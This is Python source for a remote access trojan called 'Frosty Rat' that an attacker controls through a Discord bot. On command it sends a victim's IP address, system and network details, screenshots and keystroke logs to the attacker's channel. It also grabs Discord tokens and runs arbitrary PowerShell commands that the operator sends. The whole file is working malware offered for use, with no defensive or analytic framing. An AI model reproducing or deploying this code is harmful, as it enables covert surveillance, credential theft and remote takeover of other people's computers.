import requests
import keepbotalive
import os
import socket
import discord
import psutil
import platform
from datetime import datetime
import os.path
import pyautogui
from pynput.keyboard import Listener, Key
from threading import Timer
import asyncio



#variables for infos####################################


tmppath = "C:\\Users\\{}\\AppData\\Local\\Temp".format(os.getlogin())
if_addrs = psutil.net_if_addrs()
uname = platform.uname()
boot_time_timestamp = psutil.boot_time()
bt = datetime.fromtimestamp(boot_time_timestamp)
cpufreq = psutil.cpu_freq()
svmem = psutil.virtual_memory()
swap = psutil.swap_memory()
path = os.getcwd()
parent_path = (os.path.abspath(os.path.join(path, os.pardir)))

#########################################################
#Pre initialize

intents = discord.Intents.all()
#intents.message_content = True
client = discord.Client(intents=intents)

TOKEN = ("update this")

##########################################################
filename = "log.txt"  # The file to write characters to
def on_press(key):
    f = open(filename, 'a')  # Open the file

    if hasattr(key, 'char'):  # Write the character pressed if available
        f.write(key.char)
    elif key == Key.space:  # If space was pressed, write a space
        f.write(' ')
    elif key == Key.enter:  # If enter was pressed, write a new line
        f.write('\n')
    elif key == Key.tab:  # If tab was pressed, write a tab
        f.write('\t')
    else:  # If anything else was pressed, write [<key_name>]
        f.write('[' + key.name + ']')

    f.close()  # Close the file

def restart():
        import sys
        print("argv was",sys.argv)
        print("sys.executable was", sys.executable)
        print("restart now")

        import os
        os.execv(sys.executable, ['python'] + sys.argv)


def get_size(bytes, suffix="B"):
    """
    Scale bytes to its proper format
    e.g:
        1253656 => '1.20MB'
        1253656678 => '1.17GB'
    """
    factor = 1024
    for unit in ["", "K", "M", "G", "T", "P"]:
        if bytes < factor:
            return f"{bytes:.2f}{unit}{suffix}"
        bytes /= factor



keepbotalive.awake()#so bot doesn't leave server when under inactivity

data = {"ip": ""}
ip = "ip"
try:
    import json
    iprequest = requests.get("https://ipinfo.io/json", verify=True)
    data = iprequest.json()
except:
    data[ip] = "Error Has Occured"




@client.event
async def on_ready() -> None:
    await client.wait_until_ready()
    channel = client.get_channel("replace this str with channelid")
    embedVar = discord.Embed(title="Victim Added", description="Frosty Rat Started ", color=0x0000FF)
    embedVar.add_field(name="Ip Address", value="{}".format(data["ip"]), inline=False)
    await channel.send(embed=embedVar)
    await channel.send("https://tenor.com/view/pack-watch-rip-bozo-bozo-gif-18880647")

@client.event
async def on_message(message):

        
    if message.content == ".victimsonline":
        embedVar = discord.Embed(title="Victim", description="This victims pc is online", color=0x0000FF)
        embedVar.add_field(name="Ip Address", value="{}".format(data["ip"]), inline=False)
        await message.channel.send(embed=embedVar)

    if message.content == ".sysinfo":
        embed = discord.Embed(
            title = "System Info Pulled By Frosty Rat",
            description = "System info of the victim Page 1",
            colour = 0x0000FF
        )
        embed2 = discord.Embed(
            title = "System Info Pulled By Frosty Rat",
            description = "System info of the victim Page 2",
            colour = 0x0000FF
        )
        embed.add_field(name="===== System Information =====", value="~", inline=False)
        embed.add_field(name = "System", value=(f"System: {uname.system}"),  inline=True)
        embed.add_field(name="Node Name", value=(f"Node Name: {uname.node}"), inline=True)
        embed.add_field(name="Release", value=(f"Release: {uname.release}"), inline=True)
        embed.add_field(name="Version", value=(f"Version: {uname.version}"), inline=True)
        embed.add_field(name="Machine", value=(f"Machine: {uname.machine}"), inline=True)
        embed.add_field(name="Processor", value=(f"Processor: {uname.processor}"), inline=True)
        embed.add_field(name="===== Boot Time / Info =====", value="~", inline=False)
        embed.add_field(name="Boot Time", value=(f"Boot Time: {bt.year}/{bt.month}/{bt.day} {bt.hour}:{bt.minute}:{bt.second}"), inline=True)
        embed.add_field(name="===== CPU Info =====", value="~", inline=False)
        embed.add_field(name="Physical Cores", value=("Physical cores: {}".format(psutil.cpu_count(logical=False))), inline=True)
        embed.add_field(name="Total Cores", value="Total Cores: {}".format(psutil.cpu_count(logical=True)), inline=True)
        embed.add_field(name="Max Frequency", value=(f"Max Frequency: {cpufreq.max:.2f}Mhz"), inline=True)
        embed.add_field(name="Min Frequency", value=(f"Min Frequency: {cpufreq.min:.2f}Mhz"), inline=True)
        embed.add_field(name="Current Frequency", value=(f"Current Frequency: {cpufreq.current:.2f}Mhz"), inline=True)
        embed.add_field(name="CPU Usage Per Core", value="{}%".format((psutil.cpu_percent(percpu=True, interval=1))), inline=True)
        embed.add_field(name="Total CPU Usage", value=(f"Total CPU Usage: {psutil.cpu_percent()}%"), inline=True)
        embed.add_field(name="===== Memory Info =====", value="~", inline=False)
        embed.add_field(name="Total", value=(f"Total: {get_size(svmem.total)}"), inline=True)
        embed.add_field(name="Available", value=(f"Available: {get_size(svmem.available)}"), inline=True)
        embed.add_field(name="RAM Used", value=((f"Used: {get_size(svmem.used)}")
        ), inline=True)
        embed.add_field(name=" RAM Percentage Used", value=((f"Percentage Used: {svmem.percent}%")), inline=True)
        embed.add_field(name="===== SWAP =====", value="~", inline=False)
        embed.add_field(name="SwapSize", value=(f"Swap Size: {get_size(swap.total)}"), inline=True)
        embed.add_field(name="Available", value=(f"Free: {get_size(swap.free)}"), inline=True)
        embed2.add_field(name="SWAP Used", value=(f"Used: {get_size(swap.used)}"), inline=True)
        embed2.add_field(name="SWAP Percentage Used", value=(f"Percentage: {swap.percent}%"), inline=True)
        


        name_of_file = "Network Info"
        completeName = os.path.join(parent_path, name_of_file+".txt") 
        thefile = open(completeName, "w")




        for interface_name, interface_addresses in if_addrs.items():
            for address in interface_addresses:
                thefile.write((f"=== Interface: {interface_name} ==="))
                if str(address.family) == 'AddressFamily.AF_INET':
                    thefile.write((f"  IP Address: {address.address}"))
                    thefile.write((f"  Netmask: {address.netmask}"))
                    thefile.write((f"  Broadcast IP: {address.broadcast}"))
                elif str(address.family) == 'AddressFamily.AF_PACKET':
                    thefile.write((f"  MAC Address: {address.address}"))
                    thefile.write((f"  Netmask: {address.netmask}"))
                    thefile.write((f"  Broadcast MAC: {address.broadcast}"))
        thefile.close()
        await message.channel.send(embed= embed)
        await message.channel.send(embed= embed2)
        await message.channel.send(file= discord.File(parent_path+"\\Network Info.txt"))
        os.remove(parent_path+"\\Network Info.txt")
    
    if message.content == ".ss":
        screenshot = pyautogui.screenshot()
        screenshot.save(parent_path+"\\SS.png")
        await message.channel.send(file=discord.File(parent_path+"\\SS.png"))
        if os.path.exists(parent_path+"\\SS.png"):
            os.remove(parent_path+"\\SS.png")
    
    if message.content == ".keylog":

        embedd = discord.Embed(
        title = "Keylogger",
        description = "Are you sure? Y/N",
        colour = 0x0000FF
        )
        await message.channel.send(embed = embedd)
        interaction = await client.wait_for('message', timeout=30)
        if interaction.content == "Y":
            embedd = discord.Embed(
            title = "Keylogger",
            description = "For how many seconds do you wish to listen? [reply with an int]",
            colour = 0x0000FF
            )
            await message.channel.send(embed = embedd)
            secsChoice = await client.wait_for('message', timeout=30)
            myvar = secsChoice.content
            myvar = int(myvar)
            embeddd = discord.Embed(
            title = "Keylogger started for {} seconds".format(myvar),
            description = " Keylogger Started",
            colour = 0x32CD32
            )
            await message.channel.send(embed= embeddd)
            with Listener(on_press=on_press) as ls:
                Timer(myvar, ls.stop).start()
                ls.join()
            
            embedd = discord.Embed(
            title = "Keylogger Ended after {} seconds".format(myvar),
            description = " Keylogger logs",
            colour = 0x32CD32
            )

            await message.channel.send(embed= embedd)
            await message.channel.send(file= discord.File("log.txt"))
            os.remove("log.txt")

        if interaction.content == "N":
            embedd = discord.Embed(
            title = "Keylogger",
            description = " Keylogger Dismissed",
            colour = 0xDC143C
            )
            await message.channel.send(embed = embedd)

    if message.content == ".cmds":
        cmdembed = discord.Embed (
        title="Commands:",
        colour=0xDC143C
        )
        cmdembed.add_field(name=".victimsonline", value="Tells you if the rat is currently being executed", inline=True)
        cmdembed.add_field(name=".sysinfo", value="Tells you system info of victim", inline=True)
        cmdembed.add_field(name=".ss", value="take a screenshot of victims screen", inline=True)
        cmdembed.add_field(name=".keylog", value="records victims keylogs and sends after seconds specified", inline=True)
        cmdembed.add_field(name=".cmds", value="what youre viewing right now", inline=True)
        cmdembed.add_field(name=".tlog", value="tokenlogger (discord)", inline=True)


        await message.channel.send(embed=cmdembed)
    if message.content == ".tlog":
        import tokengrabber
        tokengrabber.main()

    if message.content == ".execute":
        await message.channel.send("PS or CMD?")#
        psorcmd = await client.wait_for("message", timeout=30)

        try: 
            if psorcmd.content == "PS": 
                await message.channel.send("what command?")
                interaction = await client.wait_for("message", timeout=30)
                await message.channel.send(os.system(f"PowerShell /c {interaction.content}"))
                await message.channel.send("0 means worked , 1 means failed")
                #  await message.channel.send(f" Returned: {returned}")
            elif psorcmd.content == "CMD": 
                await message.channel.send("what command?")
                interaction = await client.wait_for("message", timeout=30)
                await message.channel.send(os.system(f"PowerShell /c {interaction.content}"))
                await message.channel.send("0 means worked , 1 means failed")

        except:
            await message.channel.send("``` Error Has Occured ```")






client.run(TOKEN)

